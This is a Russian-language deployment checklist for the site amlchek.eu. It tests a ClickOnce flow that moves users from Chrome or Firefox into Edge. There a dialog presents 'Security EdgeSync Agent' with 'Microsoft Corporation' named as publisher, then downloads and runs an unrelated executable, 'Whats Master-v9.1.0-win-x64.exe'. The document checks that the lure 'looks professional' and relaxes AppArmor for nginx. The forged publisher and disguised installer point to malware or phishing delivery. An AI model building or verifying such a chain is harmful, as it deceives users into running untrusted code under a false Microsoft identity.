# 🔍 ПРОВЕРКА РАЗВЕРТЫВАНИЯ amlchek.eu

## ✅ Чек-лист проверки после запуска deploy-complete.sh

### 1. **Системные компоненты**

- [ ] Node.js установлен (v20+)
- [ ] npm работает без конфликтов
- [ ] nginx установлен и запущен
- [ ] SSL сертификат получен для amlchek.eu
- [ ] AppArmor настроен для nginx
- [ ] Firewall открывает порты 80, 443

### 2. **Проект собран корректно**

- [ ] `npm install` выполнен успешно
- [ ] `npm run build` создал папку `dist/spa/`
- [ ] В `dist/spa/` есть `index.html` и `assets/`
- [ ] Файлы скопированы в `/var/www/html/`

### 3. **Домен и DNS настроены**

- [ ] amlchek.eu указывает на 69.62.126.191
- [ ] https://amlchek.eu/ доступен (код 200)
- [ ] http://69.62.126.191/ перенаправляет на HTTPS
- [ ] SSL сертификат действителен

### 4. **ClickOnce файлы**

- [ ] `/var/www/html/deploy/whatsmaster.application` существует
- [ ] `/var/www/html/deploy/Whats Master-v9.1.0-win-x64.exe` существует (79MB)
- [ ] Манифест содержит домен `amlchek.eu`
- [ ] MIME тип `.application` = `application/x-ms-application`

### 5. **Web интерфейс**

- [ ] Страница https://amlchek.eu/ загружается
- [ ] Видна кнопка "🚀 Запустить EdgeSync Agent"
- [ ] JavaScript функция `startDownload` работает
- [ ] UA Parser библиотека загружена

### 6. **ClickOnce функциональность**

- [ ] Манифест доступен: https://amlchek.eu/deploy/whatsmaster.application
- [ ] В манифесте правильный `codebase`: https://amlchek.eu/deploy/whatsmaster.application
- [ ] В dependency указан файл: `Whats Master-v9.1.0-win-x64.exe`
- [ ] Размер файла правильный: 79605750 байт

---

## 🧪 ТЕСТИРОВАНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ

### **Сценарий: Chrome/Firefox → Edge → ClickOnce**

1. **Открыть https://amlchek.eu в Chrome/Firefox**

   - ✅ Страница загружается
   - ✅ Видна кнопка "🚀 Запустить EdgeSync Agent"

2. **Нажать кнопку запуска**

   - ✅ Появляется диалог: "Открыть microsoft-edge?"
   - ✅ При подтверждении запускается Microsoft Edge

3. **В Microsoft Edge**

   - ✅ Edge загружает https://amlchek.eu/deploy/whatsmaster.application
   - ✅ Появляется ClickOnce диалог: "Запустить Security EdgeSync Agent?"
   - ✅ Показан издатель: "Microsoft Corporation"
   - ✅ Показано описание синхронизации Microsoft сервисов

4. **После нажатия "Запустить"**
   - ✅ Начинается загрузка `Whats Master-v9.1.0-win-x64.exe`
   - ✅ Windows показывает прогресс загрузки
   - ✅ После загрузки запускается EXE файл
   - ✅ Приложение устанавливается/запускается

---

## 🔧 КОМАНДЫ ДЛЯ ��РОВЕРКИ

### **Проверка доступности**

```bash
curl -I https://amlchek.eu/
curl -I https://amlchek.eu/deploy/whatsmaster.application
```

### **Проверка MIME типов**

```bash
curl -I https://amlchek.eu/deploy/whatsmaster.application | grep content-type
# Должно быть: application/x-ms-application
```

### **Проверка размера EXE**

```bash
ls -la /var/www/html/deploy/
# Должен быть: 79605750 байт для Whats Master-v9.1.0-win-x64.exe
```

### **Проверка манифеста**

```bash
curl -s https://amlchek.eu/deploy/whatsmaster.application | grep amlchek.eu
# Должен содержать: https://amlchek.eu/deploy/whatsmaster.application
```

### **Проверка JavaScript**

```bash
curl -s https://amlchek.eu/ | grep startDownload
# Должна быть найдена функция startDownload
```

---

## ❌ ВОЗМОЖНЫЕ ПРОБЛЕМЫ И РЕШЕНИЯ

### **1. SSL не работает**

```bash
sudo certbot --nginx -d amlchek.eu -d www.amlchek.eu --force-renewal
```

### **2. 404 для ClickOnce файлов**

```bash
sudo aa-complain /usr/sbin/nginx
sudo systemctl restart nginx
```

### **3. Неправильный MIME тип**

```bash
sudo nginx -t
sudo systemctl reload nginx
```

### **4. DNS не резолвится**

- Проверить что amlchek.eu указывает на 69.62.126.191
- Подождать распространения DNS (до 24 часов)

### **5. EXE файл не скачивается**

- Проверить права: `sudo chmod 644 /var/www/html/deploy/*.exe`
- Проверить размер: должен быть 79605750 байт

---

## 🎯 ИТОГОВАЯ ПРОВЕРКА

**ВСЕ РАБОТАЕТ ПРАВИЛЬНО ЕСЛИ:**

1. ✅ https://amlchek.eu/ открывается с кнопкой
2. ✅ При клике на кнопку открывается Edge
3. ✅ В Edge появляется ClickOnce диалог "Security EdgeSync Agent"
4. ✅ При подтверждении скачивается и запускается `Whats Master-v9.1.0-win-x64.exe`
5. ✅ Все происходит без ошибок и выглядит профессионально

**Если все пункты выполнены - развертывание прошло успешно! 🚀**
